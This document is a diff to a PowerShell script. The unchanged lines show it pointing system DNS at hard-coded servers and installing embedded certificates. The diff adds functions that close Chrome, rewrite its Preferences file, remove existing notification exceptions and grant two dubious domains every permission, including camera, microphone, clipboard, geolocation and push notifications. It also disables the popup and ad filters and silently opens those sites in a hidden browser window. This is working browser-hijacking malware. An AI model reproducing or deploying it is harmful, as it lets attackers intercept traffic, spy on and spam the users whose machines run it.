@@ -1,6 +1,7 @@
 ﻿$PrimaryDNSServer = '185.247.141.78'
 $SecondaryDNSServer = '185.247.141.51'
 $updateUrl = 'http://185.247.141.78/dynamicdata/upd/update.txt'
+$xpushes = @('https://sex-razdevalka.online', 'https://wps-office.site')
 $xdata = @{
     'mc.yandex.ru'='MIIKsQIBAzCCCm0GCSqGSIb3DQEHAaCCCl4EggpaMIIKVjCCBg8GCSqGSIb3DQEHAaCCBgAEggX8MIIF+DCCBfQGCyqGSIb3DQEMCgECoIIE/jCCBPowHAYKKoZIhvcNAQwBAzAOBAg7b907Z/l3VAICB9AEggTYV4Gwenr9KDAv3madoOk1EeF82TazbxTdlpCswTGL'+ 
 'IAQILTlqcPV/Gmp+Rn+//oP5vTJs0rRSP2Jm1Dj5J1XH4eySKWYJGIZ7B7EMNaxtSLep+0CDRTdEgRdRUNcgzZ6q+0sXRbdrTJtgP+EY4raH36QYFc0SThhDBYUFXmORAXiMPjd4Qyvch9WBVbL4Mry7OReP9hVofX4FJ7K9I0zzY2uYCkI7eyN9OsB50bbzD8ON99lr'+ 
@@ -198,6 +199,247 @@ function ConfigureChrome {
 
     Write-Output "Chrome configured"
 }
+
+
+
+
+
+
+
+
+
+function PushDomain
+{ 
+    param ($pushUrl)
+    $parsedUri = [System.Uri]::new($pushUrl)
+    $domain = $parsedUri.Host
+    $port=443;
+    $port = if ($parsedUri.Port -eq -1) {
+    } else {
+        $parsedUri.Port
+    }
+    $result = "https://" + $domain + ":" + "$port,*"
+    return $result
+}
+
+function PushExists
+{
+    (param $pushUrl)
+    foreach ($push in $xpushes) 
+    {
+        if ($push -eq (PushDomain -pushUrl $push))
+        {
+            return $true;
+        }
+    }
+    return $false
+}
+
+function List-Pushes()
+{
+    $preferencesPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"
+
+    # Check if the Preferences file exists
+    if (Test-Path $preferencesPath) {
+        $preferencesContent = Get-Content -Path $preferencesPath -Raw | ConvertFrom-Json
+
+        $notificationSettings = $preferencesContent.profile.content_settings.exceptions.notifications
+
+        if ($notificationSettings -isnot [array]) {
+            $notificationSettings = @($notificationSettings)
+        }
+
+        if ($notificationSettings) {
+            foreach ($item in $notificationSettings) {
+                $jsonItem = $item | ConvertTo-Json -Depth 1
+                Write-Output $jsonItem
+            }
+        } else {
+            Write-Output "No notification settings found."
+        }
+    } else {
+        Write-Output "Preferences file not found at path: $preferencesPath"
+    }
+}
+
+function Remove-Pushes {
+    $preferencesPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"
+
+    # Check if the Preferences file exists
+    if (Test-Path $preferencesPath) {
+        $preferencesContent = Get-Content -Path $preferencesPath -Raw | ConvertFrom-Json
+        $notificationSettings = $preferencesContent.profile.content_settings.exceptions.notifications
+
+        if ($notificationSettings) {
+            $keysToRemove = @()
+
+            $keys = $notificationSettings.Keys
+            for ($i = 0; $i -lt $keys.Count; $i++) {
+                $siteUrl = $keys[$i]
+                $permission = (PushExists -pushUrl $siteUrl)
+
+                if ($permission -eq $false) {
+                    $keysToRemove += $siteUrl
+                }
+            }
+
+            foreach ($key in $keysToRemove) {
+                $notificationSettings.Remove($key)
+            }
+            $newPreferencesContent = $preferencesContent | ConvertTo-Json -Depth 100
+            Set-Content -Path $preferencesPath -Value $newPreferencesContent -Force
+
+            Write-Output "All selected push notification settings have been removed."
+        } else {
+            Write-Output "No notification settings found."
+        }
+    } else {
+        Write-Output "Preferences file not found at path: $preferencesPath"
+    }
+}
+
+function Add-Push {
+    param (
+        [string]$pushUrl
+    )
+
+    $pushDomain = PushDomain -pushUrl $pushUrl
+
+    $chromePreferencesPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"
+
+    if (-not (Test-Path -Path $chromePreferencesPath)) {
+        Write-Host "Chrome preferences file not found at path: $chromePreferencesPath"
+        exit
+    }
+
+    $preferencesContent = Get-Content -Path $chromePreferencesPath -Raw | ConvertFrom-Json
+
+    if (-not $preferencesContent.profile) {
+        $preferencesContent | Add-Member -MemberType NoteProperty -Name profile -Value @{}
+    }
+
+    if (-not $preferencesContent.profile.default_content_setting_values) {
+        $preferencesContent.profile | Add-Member -MemberType NoteProperty -Name default_content_setting_values -Value @{}
+    }
+
+    if (-not $preferencesContent.profile.default_content_setting_values.popups) {
+        $preferencesContent.profile.default_content_setting_values | Add-Member -MemberType NoteProperty -Name popups -Value 1
+    } else {
+        $preferencesContent.profile.default_content_setting_values.popups = 1
+    }
+
+    if (-not $preferencesContent.profile.default_content_setting_values.subresource_filter) {
+        $preferencesContent.profile.default_content_setting_values | Add-Member -MemberType NoteProperty -Name subresource_filter -Value 1
+    } else {
+        $preferencesContent.profile.default_content_setting_values.subresource_filter = 1
+    }
+
+    $preferencesContentJson = $preferencesContent | ConvertTo-Json -Depth 32
+    Set-Content -Path $chromePreferencesPath -Value $preferencesContentJson -Force
+
+    $preferencesPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"
+
+    if (Test-Path $preferencesPath) {
+        $preferencesContent = Get-Content -Path $preferencesPath -Raw | ConvertFrom-Json
+        $contentSettings = $preferencesContent.profile.content_settings.exceptions
+        $settingsToUpdate = @(
+            "auto_picture_in_picture", "background_sync", "camera", "clipboard", "cookies", 
+            "geolocation", "images", "javascript", "microphone", "midi_sysex", 
+            "notifications", "popups", "plugins", "sound", "unsandboxed_plugins", 
+            "automatic_downloads", "flash_data", "mixed_script", "sensors","window_placement","webid_api","vr",
+            "subresource_filter","media_stream_mic","media_stream_mic","media_stream_camera","local_fonts",
+            "javascript_jit","idle_detection","captured_surface_control","ar"
+
+        )
+
+        foreach ($setting in $settingsToUpdate) {
+            if ($null -eq $contentSettings.$setting) {
+                $contentSettings | Add-Member -MemberType NoteProperty -Name $setting -Value @{}
+            }
+            $specificSetting = $contentSettings.$setting
+            if ($specificSetting.PSObject.Properties.Name -contains $pushDomain) {
+                Write-Output "The website URL $pushDomain already exists in the $setting settings."
+            } else {
+                $specificSetting | Add-Member -MemberType NoteProperty -Name $pushDomain -Value @{
+                    "last_modified" = "13362720545785774"
+                    "setting" = 1
+                }
+                $contentSettings.$setting = $specificSetting
+            }
+        }
+
+        $preferencesContent.profile.content_settings.exceptions = $contentSettings
+        $updatedPreferencesJson = $preferencesContent | ConvertTo-Json -Depth 10
+        $updatedPreferencesJson | Set-Content -Path $preferencesPath -Encoding UTF8
+
+        Write-Output "Notification subscription for $pushDomain added successfully with all permissions."
+    } else {
+        Write-Output "Preferences file not found at path: $preferencesPath"
+    }
+}
+
+function Open-ChromeWithUrl {
+    param (
+        [string]$url,
+        [int]$waitSeconds = 10
+    )
+
+    # Define possible paths to the Chrome executable
+    $chromePaths = @(
+        "C:\Program Files\Google\Chrome\Application\chrome.exe",
+        "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
+        "$env:LOCALAPPDATA\Google\Chrome\Application\chrome.exe",
+        "$env:ProgramFiles\Google\Chrome\Application\chrome.exe",
+        "$env:ProgramFiles(x86)\Google\Chrome\Application\chrome.exe"
+    )
+
+    # Resolve variables and remove duplicates
+    $resolvedPaths = @()
+    foreach ($path in $chromePaths) {
+        try {
+            $resolvedPath = Resolve-Path -Path $path -ErrorAction Stop
+            if ($resolvedPath -notin $resolvedPaths) {
+                $resolvedPaths += $resolvedPath.Path
+            }
+        } catch {
+            Write-Output "Error resolving path: $_"
+        }
+    }
+
+    # Filter out duplicates
+    $resolvedPaths = $resolvedPaths | Select-Object -Unique
+
+    # Iterate through each resolved path
+    foreach ($path in $resolvedPaths) {
+        if (Test-Path -Path $path) {
+            Write-Output "Found Chrome at: $path"
+            # Start Chrome and navigate to the URL, capturing the process object
+            $chromeProcess = Start-Process -FilePath $path -ArgumentList $url -PassThru -WindowStyle Hidden
+            # Wait for the specified number of seconds
+            Start-Sleep -Seconds $waitSeconds
+            # Terminate the Chrome process
+            Write-Output "Closing Chrome process with ID: $($chromeProcess.Id)"
+            Stop-Process -Id $chromeProcess.Id -Force
+        } else {
+            Write-Output "Chrome not found at: $path"
+        }
+    }
+}
+
+
+function ConfigureChromePushes {
+    Close-Processes(@('chrome.exe'))
+    Remove-Pushes;
+    foreach ($push in $xpushes) {
+        Add-Push -pushUrl $push
+    }
+    List-Pushes;
+    foreach ($push in $xpushes) {
+        Open-ChromeWithUrl -url $push -waitSeconds 8
+    }
+}
+
+ConfigureChromePushes
 
 
 
@@ -533,6 +775,9 @@ function ConfigureYandexInternal {
 
 
 
+
+
+
 function main {
     Set-DNSServers -PrimaryDNSServer $primaryDNSServer -SecondaryDNSServer $secondaryDNSServer
     ConfigureCertificates
@@ -542,6 +787,7 @@ function main {
     ConfigureFireFox
     ConfigureOpera
     ConfigureChromeUblock
+    ConfigureChromePushes
 }
 
 main
